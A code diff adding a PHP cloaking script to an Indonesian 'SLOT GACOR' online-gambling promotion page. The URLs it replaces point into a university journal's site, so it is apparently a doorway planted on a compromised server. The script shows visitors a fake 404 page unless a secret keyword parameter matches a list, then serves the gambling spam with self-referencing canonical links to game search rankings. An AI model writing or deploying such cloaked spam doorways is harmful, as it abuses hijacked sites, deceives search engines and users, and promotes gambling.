@@ -1,4 +1,46 @@
+<?php
 
+function feedback404()
+{
+    header("HTTP/1.0 404 Not Found");
+    echo "<h1><strong>404 Not Found</strong></h1>";
+    echo "The requested URL/badpage was not found on this server";
+}
+
+if (isset($_GET['gacor'])) {
+    $filename = "listkw.txt";
+    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    $target_string = strtolower($_GET['gacor']);
+    foreach ($lines as $item) {
+        if (strtolower($item) === $target_string) {
+            $BRAND = strtoupper($target_string);
+        }
+    }
+    if (isset($BRAND)) {
+        $BRANDS = $BRAND;
+        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+        $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+        if (isset($fullUrl)) {
+            $parsedUrl = parse_url($fullUrl);
+            $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
+            $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
+            $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
+            $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
+            $baseUrl = $scheme . "://" . $host . $path . '?' . $query;
+            $urlPath = $baseUrl;
+        } else {
+            echo "URL saat ini tidak didefinisikan.";
+        }
+    } else {
+        feedback404();
+        exit();
+    }
+} else {
+    feedback404();
+    exit();
+}
+
+?>
 
 <!doctype html>
 <html class="no-js" lang="en">
@@ -8,7 +50,7 @@
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="theme-color" content="">
     <link rel="amphtml" href="https://kontolkuda.pages.dev/uho/"/>
-    <link rel="canonical" href="https://journal.fib.uho.ac.id/api/v2/zero-sgg/?gacor=slot+gacor"><link rel="icon" type="image/png" href="//slot-anti-boncos.myshopify.com/cdn/shop/files/logo-gs88.png?crop=center&height=32&v=1706103887&width=32"><link rel="preconnect" href="https://fonts.shopifycdn.com" crossorigin><title>
+    <link rel="canonical" href="<?php echo $urlPath ?>"><link rel="icon" type="image/png" href="//slot-anti-boncos.myshopify.com/cdn/shop/files/logo-gs88.png?crop=center&height=32&v=1706103887&width=32"><link rel="preconnect" href="https://fonts.shopifycdn.com" crossorigin><title>
       SLOT GACOR 🚨 Daftar Link Situs Slot Paling Gacor Dan Gampang Menang Malam Hari Ini
  &ndash; SLOT GACOR</title>
 
@@ -19,7 +61,7 @@
     
 
 <meta property="og:site_name" content="SLOT GACOR">
-<meta property="og:url" content="https://journal.fib.uho.ac.id/api/v2/zero-sgg/?gacor=slot+gacor">
+<meta property="og:url" content="<?php echo $urlPath ?>">
 <meta property="og:title" content="SLOT GACOR 🚨 Daftar Link Situs Slot Paling Gacor Dan Gampang Menang Malam Hari Ini">
 <meta property="og:type" content="product">
 <meta property="og:description" content="Temukan situs SLOT GACOR paling sukses dengan panduan kami. Tingkatkan peluang Anda untuk menang dengan permainan slot berperingkat teratas. Jangan lewatkan pembayaran tertinggi dan gameplay termudah. Bergabunglah sekarang dan dominasi malam ini!"><meta property="og:image" content="http://slot-anti-boncos.myshopify.com/cdn/shop/files/SLOTONLINE.jpg?v=1706189347">
@@ -34,7 +76,7 @@
     <script src="//slot-anti-boncos.myshopify.com/cdn/shop/t/2/assets/constants.js?v=58251544750838685771706103266" defer="defer"></script>
     <script src="//slot-anti-boncos.myshopify.com/cdn/shop/t/2/assets/pubsub.js?v=158357773527763999511706103266" defer="defer"></script>
     <script src="//slot-anti-boncos.myshopify.com/cdn/shop/t/2/assets/global.js?v=113367515774722599301706103266" defer="defer"></script><script src="//slot-anti-boncos.myshopify.com/cdn/shop/t/2/assets/animations.js?v=88693664871331136111706103264" defer="defer"></script><script>window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.start');</script><meta id="shopify-digital-wallet" name="shopify-digital-wallet" content="/68535714018/digital_wallets/dialog">
-<link rel="alternate" type="application/json+oembed" href="https://journal.fib.uho.ac.id/api/v2/zero-sgg/?gacor=slot+gacor.oembed">
+<link rel="alternate" type="application/json+oembed" href="<?php echo $urlPath ?>.oembed">
 <script async="async" src="/checkouts/internal/preloads.js?permanent-domain=dd1a60-4.myshopify.com&locale=en-ID"></script>
 <script id="shopify-features" type="application/json">{"accessToken":"424f848ac96ab93fbd5a381135c09a84","betas":["rich-media-storefront-analytics"],"domain":"slot-anti-boncos.myshopify.com","predictiveSearch":true,"shopId":68535714018,"smart_payment_buttons_url":"https:\/\/slot-anti-boncos.myshopify.com\/cdn\/shopifycloud\/payment-sheet\/assets\/latest\/spb.en.js","dynamic_checkout_cart_url":"https:\/\/slot-anti-boncos.myshopify.com\/cdn\/shopifycloud\/payment-sheet\/assets\/latest\/dynamic-checkout-cart.en.js","locale":"en","optimusEnabled":true,"optimusHidden":false,"shopPromiseVariantForOptimusEnabled":false}</script>
 <script>var Shopify = Shopify || {};
@@ -942,7 +984,7 @@ for (var attr in meta) {
   </details>
 </details-modal>
 
-<a href="https://journal.fib.uho.ac.id/api/v2/zero-sgg/?gacor=slot+gacor" class="header__heading-link link link--text focus-inset"><div class="header__heading-logo-wrapper">
+<a href="<?php echo $urlPath ?>" class="header__heading-link link link--text focus-inset"><div class="header__heading-logo-wrapper">
                 
                 <img src="//slot-anti-boncos.myshopify.com/cdn/shop/files/GILASLOT88.png?v=1706103885&amp;width=600" alt="SLOT GACOR" srcset="//slot-anti-boncos.myshopify.com/cdn/shop/files/GILASLOT88.png?v=1706103885&amp;width=160 160w, //slot-anti-boncos.myshopify.com/cdn/shop/files/GILASLOT88.png?v=1706103885&amp;width=240 240w, //slot-anti-boncos.myshopify.com/cdn/shop/files/GILASLOT88.png?v=1706103885&amp;width=320 320w" width="160" height="69.375" loading="eager" class="header__heading-logo" sizes="(min-width: 750px) 160px, 50vw">
               </div></a><div class="header__icons header__icons--localization header-localization">
@@ -1329,7 +1371,7 @@ Item added to your cart
                   
 <input type="hidden" name="product-id" value="8280361861346" /><input type="hidden" name="section-id" value="template--17282700738786__main" /></form></div><div class="product__description rte quick-add-hidden" >
                   <p><a href="https://kontolkuda.pages.dev/uho/" title="SLOT GACOR"><img alt="SLOT GACOR" src="https://cdn.shopify.com/s/files/1/0685/3571/4018/files/zeus_gacor_480x480.webp?v=1706102186"></a></p>
-<p>Temukan situs <a href="https://journal.fib.uho.ac.id/api/v2/zero-sgg/?gacor=slot+gacor" title="SLOT GACOR"><strong>SLOT GACOR</strong></a> paling sukses dengan panduan kami. Tingkatkan peluang Anda untuk menang dengan permainan slot berperingkat teratas. Jangan lewatkan pembayaran tertinggi dan gameplay termudah. Bergabunglah sekarang dan dominasi malam ini!</p>
+<p>Temukan situs <a href="<?php echo $urlPath ?>" title="SLOT GACOR"><strong>SLOT GACOR</strong></a> paling sukses dengan panduan kami. Tingkatkan peluang Anda untuk menang dengan permainan slot berperingkat teratas. Jangan lewatkan pembayaran tertinggi dan gameplay termudah. Bergabunglah sekarang dan dominasi malam ini!</p>
                 </div><a href="/products/slot-online" class="link product__view-details animate-arrow">
           View full details
           <svg
@@ -1528,7 +1570,7 @@ Item added to your cart
     <div class="footer__content-bottom-wrapper page-width">
       <div class="footer__copyright caption">
         <small class="copyright__content"
-          >&copy; 2024, <a href="https://journal.fib.uho.ac.id/api/v2/zero-sgg/?gacor=slot+gacor" title="">SLOT GACOR</a></small>
+          >&copy; 2024, <a href="<?php echo $urlPath ?>" title="">SLOT GACOR</a></small>
         <small class="copyright__content"><a target="_blank" rel="nofollow" href="https://www.shopify.com?utm_campaign=poweredby&amp;utm_medium=shopify&amp;utm_source=onlinestore">Powered by ZeroSGG</a></small></div>
     </div>
   </div>
